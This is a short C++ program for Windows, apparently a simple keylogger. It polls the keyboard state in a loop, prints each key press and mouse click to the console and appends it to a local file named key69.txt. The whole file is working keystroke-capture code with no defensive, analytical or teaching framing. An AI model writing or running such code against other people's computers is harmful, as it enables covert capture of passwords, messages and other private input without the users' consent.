#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <fstream>
#include <string>

using namespace std;

void tofile(string word) {
	ofstream logfile;
	logfile.open("key69.txt",ofstream::app);
	logfile << word;
	logfile.close();


}
void twofile(char k) {
	ofstream logfile;
	logfile.open("key69.txt", ofstream::app);
	logfile << k;
	logfile.close();

}

bool xxx(int i) {
	switch (i) 
	{
	case VK_RETURN:
		cout << "\n";
		tofile("\n");
		return TRUE;
		break;
	case VK_SHIFT:
		cout << " Shift ";
		tofile("'Shift'");
		return TRUE;
		break;
	case VK_SPACE:
		cout << " ";
		tofile(" ");
		return TRUE;
		break;
	case VK_BACK:
		cout << "\b \b" ;
		tofile("\b \b");
		return TRUE;
		break;
	case VK_RBUTTON:
		cout << " Right click ";
		tofile("Rclick");
		return TRUE;
		break;
	case VK_LBUTTON:
		cout << " Left click ";
		tofile("Lclick");
		return TRUE;
		break;
	default:
		
		return FALSE;
		break;
	
	
	}

}

int main() {
	char key;
	
	while(true) {
		Sleep(10);

		for (key = 8; key <= 190; key++) {
			
			if (GetAsyncKeyState(key)==-32767) {
				if (xxx(key) == FALSE) {
					
					cout << key;
					twofile(key);
				}
			
			
			
			}
		
		}
	}
	return 0;

}
